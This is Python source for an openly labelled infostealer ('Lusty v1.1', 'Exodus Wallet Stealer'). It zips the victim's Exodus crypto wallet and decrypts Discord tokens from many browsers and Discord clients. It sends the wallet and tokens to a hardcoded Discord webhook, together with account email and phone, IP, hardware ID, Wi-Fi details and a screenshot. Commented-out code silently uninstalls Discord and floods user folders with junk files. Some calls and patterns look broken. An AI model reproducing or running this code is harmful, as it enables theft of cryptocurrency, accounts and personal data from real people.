from libs.libs import *

webhook = '%webhook%'

class Exodus:
    def __init__(self, webhook):
        self.webhook = webhook

def zip_directory(directory_path, output_zip):
    shutil.make_archive(output_zip, 'zip', directory_path)

def get_files_in_zip(zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        return zip_ref.namelist()

def send_file_to_webhook(file_path, webhook, embed):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file)}
        payload = {
            'embeds': [embed]
        }
        response = requests.post(webhook, files=files, data={'payload_json': json.dumps(payload)})
        
        if response.status_code == 200:
            pass
        else:
            pass

def send_embed_to_webhook(webhook, embed):
    payload = {
        'embeds': [embed]
    }
    response = requests.post(webhook, data={'payload_json': json.dumps(payload)})
    
    if response.status_code == 200:
        pass
    else:
        pass


username = os.getlogin()

directory = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus.wallet')
output_zip = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus_wallet_{username}')
webhook = 'https://discord.com/api/webhooks/1262469390469693471/W-fncfCFfJ_RtGR7ZX2-Q8oOWm-qiBH0Pu9jpqjZvB3THuyjACBbCrGRqCwa3cmMbU6u'

if os.path.isdir(directory):
    zip_directory(directory, output_zip)
    
    zip_file_path = f"{output_zip}.zip"
    file_list = get_files_in_zip(zip_file_path)
    
    embed = {
        "title": "Exodus Wallet Stealer",
        "description": f"Exodus wallet from {username}'s computer.",
        "color": 0x000000, 
        "fields": [
            {
                "name": "Username",
                "value": username,
                "inline": False
            },
            {
                "name": "Directory",
                "value": directory,
                "inline": False
            },
            {
                "name": "Files in Zip",
                "value": "\n".join(file_list),
                "inline": False
            }
        ]
    }
    
    send_file_to_webhook(zip_file_path, webhook, embed)
else:
    embed = {
        "title": "Exodus Wallet Not Found",
        "description": f"{username} does not have an Exodus wallet directory.",
        "color": 0x000000, 
        "fields": [
            {
                "name": "Username",
                "value": username,
                "inline": False
            }
        ]
    }
    
    send_embed_to_webhook(webhook, embed)


#def udscrd():
#    try:
#        kill_command = 'taskkill /F /IM discord.exe'
#        result = subprocess.run(kill_command, capture_output=True, text=True, shell=True)
#        find_discord_cmd = 'Get-WmiObject -Query "SELECT * FROM Win32_Product WHERE Name LIKE \'%Discord%\'"'
#        result = subprocess.run(['powershell', '-Command', find_discord_cmd], capture_output=True, text=True)
#        
#        if 'Discord' in result.stdout:
#            product_code = None
#            for line in result.stdout.split('\n'):
#                if "IdentifyingNumber" in line:
#                    product_code = line.split(' ')[-1].strip()
#                    break
#            
#            if product_code:
#                uninstall_cmd = f'Msiexec /x {product_code} /quiet'
#                uninstall_result = subprocess.run(['powershell', '-Command', uninstall_cmd], capture_output=True, text=True)
#                
#                if uninstall_result.returncode == 0:
#                    pass
#                else:
#                    pass
#            else:
#                pass
#        else:
#            pass
#    
#    except Exception as e:
#        pass
#
#def troll(directory):
#    for _ in range(1000):
#        for _ in range(1000):
#            random_filename = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.txt'
#            with open(os.path.join(directory, random_filename), 'w', encoding='utf-8') as f:
#                f.write(generate_japanese_text())
#
#def generate_japanese_text():
#    japanese_letters = ''.join(chr(random.randint(0x3041, 0x3096)) for _ in range(100000))
#    return japanese_letters
#
#def dir():
#    user_home = os.path.expanduser('~')
#    desktop_dir = os.path.join(user_home, 'Desktop')
#    downloads_dir = os.path.join(user_home, 'Downloads')
#    pictures_dir = os.path.join(user_home, 'Pictures')
#    videos_dir = os.path.join(user_home, 'Videos')
#
#    for directory in [desktop_dir, downloads_dir, pictures_dir, videos_dir]:
#        if platform.system() == 'Windows':
#            troll(directory)
#        else:
#            pass

def send_embed(embed):
    payload = {"embeds": [embed]}
    response = requests.post(webhook, json=payload)
    if response.status_code != 200:
        pass

def wif():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return "Error: Unable to retrieve Wi-Fi information."
    except Exception as e:
        return f"Error: {str(e)}"


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def fig():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_nox():
    already_check = []
    checker = []
    cleaned = []
    nox = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                nox.append(values)
                except PermissionError: continue
        for i in nox:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = fig()
                        pc_username = getenv("UserName")
                        pc_name = getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = {
                            "title": user_name,
                            "color": 0x000000,
                            "author": {
                                "name": "Lusty v1.1 | Dev Lust",
                                "icon_url": "https://cdn.discordapp.com/attachments/1260612112577859625/1262461697868955789/29c5a991498a513535ee2350ac7013d0.jpg?ex=6696ae94&is=66955d14&hm=250ebdcf36de158b1409cc5d39451319d0adcb57110adf95c9b2f421f7879ddf&"
                            },
                            "footer": {
                                "text": "Dev Lust | https://github.com/datascraped"
                            },
                            "fields": [
                                {"name": "User ID", "value": user_id, "inline": True},
                                {"name": "Account Information", "value": f"<a:blackdiamond:856110506670161930> Email: `{email}`\n<a:blackdiamond:856110506670161930> Phone: `{phone}`\n<a:blackdiamond:856110506670161930> 2FA/MFA Enabled: `{mfa_enabled}`\n<a:blackdiamond:856110506670161930> Nitro: `{has_nitro}`\n<a:blackdiamond:856110506670161930> Expires in: `{days_left if days_left else 'None'} day(s)`", "inline": False},
                                {"name": "PC Information", "value": f"<a:blackdiamond:856110506670161930> IP: `{ip}`\n<a:blackdiamond:856110506670161930> Username: `{pc_username}`\n<a:blackdiamond:856110506670161930> PC Name: `{pc_name}`\n<a:blackdiamond:856110506670161930> Platform: `{platform}`", "inline": False},
                                {"name": "Token", "value": f"||{tok}||", "inline": False}
                            ]
                        }
                        payload = {
                            "embeds": [embed]
                        }
                        try:
                            res = requests.post(f'{webhook}', json=payload, headers=headers)
                            if res.status_code == 204:
                                pass
                        except Exception as e:
                            pass
                else: continue
    
    con_info = wif()
    con_embed = {
        "title": "**Wi-Fi Information**",
        "color": 0x000000,
        "fields": [
            {"name": "<a:blackdiamond:856110506670161930> **Wi-Fi Info**", "value": f"```js{con_info}```", "inline": False}
        ]
    }
    con_payload = {
        "embeds": [con_embed]
    }
    con_res = requests.post(f'{webhook}', json=con_payload)
    if con_res.status_code == 204:
        pass

    screenshot = ImageGrab.grab()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    screenshot_embed = {
        "title": "**Screenshot**",
        "color": 0x000000,
        "image": {
            "url": "attachment://" + screenshot_path
        }
    }
    screenshot_payload = {
        "embeds": [screenshot_embed]
    }
    screenshot_files = {
        "file": open(screenshot_path, "rb")
    }
    screenshot_res = requests.post(f'{webhook}', json=screenshot_payload, files=screenshot_files)
    if screenshot_res.status_code == 204:
        pass



if __name__ == '__main__':
    #udscrd()
    get_nox()
    n0x(webhook)
    os.remove("screenshot.png")
    Exodus(webhook)
    #dir()
